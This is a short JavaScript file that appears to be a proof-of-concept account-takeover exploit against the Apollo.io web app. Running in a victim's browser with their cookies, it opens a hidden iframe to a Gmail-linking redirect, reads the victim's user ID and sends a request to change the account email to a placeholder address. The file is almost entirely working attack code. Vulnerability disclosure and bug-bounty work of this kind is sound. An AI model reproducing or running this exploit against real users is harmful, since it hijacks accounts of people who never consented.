async function updateUser() {
  const url = "https://app.apollo.io/api/v1/users/current";

  const body = {
    notification_last_read_at: new Date().toISOString(),
    cacheKey: Date.now()
  };

  try {
    const res = await fetch(url, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json"
        // Add auth header if needed
      },
      credentials: "include" // ✅ ensures cookies are sent
    });

    if (!res.ok) throw new Error(`Request failed: ${res.status}`);
    const data = await res.json();
    return data.user?.id;
  } catch (err) {
    console.error("updateUser error:", err);
  }
}

async function fetchRedirect() {
  try {
    const step1 = await fetch(
      "https://app.apollo.io/api/v1/email_accounts/link_gmail?mode=user_signin&redirect_to=https%3A%2F%2Fapp.apollo.io%2F%23%2Fonboarding-hub%2Fqueue&cacheKey=" + Date.now(),
      {
        cache: "no-store",
        credentials: "include"
      }
    );

    const data1 = await step1.json();
    const redirectTo = data1?.redirect_to;
    if (!redirectTo) {
      console.warn("❌ No redirect_to found.");
      return;
    }

    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = redirectTo;
    document.body.appendChild(iframe);

  } catch (err) {
    console.error("fetchRedirect error:", err);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

export async function createUser() {
  await fetchRedirect();
  await sleep(3000);

  const id = await updateUser(); // ✅ fixed scoping
  if (!id) {
    console.error("No user ID found.");
    return;
  }

  const url = `https://app.apollo.io/api/v1/users/${id}/request_email_change`;
  const body = { email: "POCCCCCCC@gmail.com", cacheKey: Date.now() };

  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify(body)
    });

    const data = await res.json();
    console.log("Response:", data);
  } catch (err) {
    console.error("createUser error:", err);
  }
}
